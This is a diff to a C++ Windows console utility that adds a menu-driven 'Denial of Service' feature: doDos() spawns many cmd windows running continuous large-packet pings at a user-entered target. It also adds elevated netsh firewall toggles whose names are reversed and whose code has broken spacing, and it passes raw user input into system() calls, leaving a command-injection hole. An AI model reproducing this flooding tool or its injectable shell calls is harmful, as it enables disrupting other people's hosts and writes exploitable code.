@@ -206,6 +206,64 @@ void handleOption(OPTION option) {
     }
 }
 
+std::string askName() {
+    std::string name;
+
+    std::cout << "What is their name?: ";
+    std::getline(std::cin >> std::ws, name);
+
+    return name;
+}
+
+std::string askNum() {
+    std::string input;
+
+    std::cout << "What is their number?: ";
+    std::getline(std::cin >> std::ws, input);
+
+    return input;
+}
+
+void searchUrl(std::string url, std::string query) {
+    std::replace(query.begin(), query.end(), ' ', '+');
+    system(("start " + url + query).c_str());
+}
+
+void dos() {
+    int bytes;
+    int instances;
+    std::string target;
+
+    printf("This program attempts a Denial of Service attack on whatever target you want.\n");
+    printf("\033[1;33mDISCLAIMER: I am not responsible for misuse of this program. Only use this program with express permission from the person this is used on.\n");
+
+    while (running) {
+        printf("\033[1;mInput target: ");
+        std::cin >> target;
+
+        printf("How many bytes of data per ping should be sent? (max 65500): ");
+        std::cin >> bytes;
+
+        if (bytes > 65500 || bytes <= 0) {
+            printf("ERROR: invalid byte size\n");
+            return;
+        }
+        printf("How many instances of the ping command should be initialized?: ");
+        std::cin >> instances;
+        doDos(bytes, instances, target);
+        break;
+    }
+
+}
+
+void networkDiscoveryOff() {
+    system("powershell -Command \"Start-Process cmd -ArgumentList '/k netsh advfirewall firewall set rule group=\\\"Network Discovery\\\" new enable=Yes' -Verb RunAs\"");
+}
+
+void networkDiscoveryOn() {
+    system("powershell -Command \"Start-Process cmd - ArgumentList '/k netsh advfirewall firewall set rule group=\\\"Network Discovery\\\" new enable=No' - Verb RunAs\"");
+}
+
 void otherStuff() {
     printf("\033[0;32m\n"
         "___  ___                     _          __  ___\n"
@@ -244,39 +302,29 @@ void handleOtherOption(OTHEROPTION option) {
     case Exit: 
         running = false;
         break;
+
     case DoS:
+        dos();
         break;
+
     case NetworkDiscoveryOff:
+        networkDiscoveryOff();
         break;
+        
     case NetworkDiscoveryOn:
+        networkDiscoveryOn();
         break;
+
     case About:
         printf("\nsame diff but with cooler shi\n");
         break;
     }
 }
 
-std::string askName() {
-    std::string name;
-
-    std::cout << "What is their name?: ";
-    std::getline(std::cin >> std::ws, name);
-
-    return name;
-}
-
-std::string askNum() {
-    std::string input;
-
-    std::cout << "What is their number?: ";
-    std::getline(std::cin >> std::ws, input);
-
-    return input;
-}
-
-void searchUrl(std::string url, std::string query) {
-    std::replace(query.begin(), query.end(), ' ',  '+');
-    system(("start " + url + query).c_str());
+void doDos(int bytes, int instances, std::string target) {
+    for (int i = 0; i < instances; i++) {
+        system(("start cmd /k ping " + target + " -l " + std::to_string(bytes) + " -t").c_str());
+    }
 }
 
 void cleanup() {
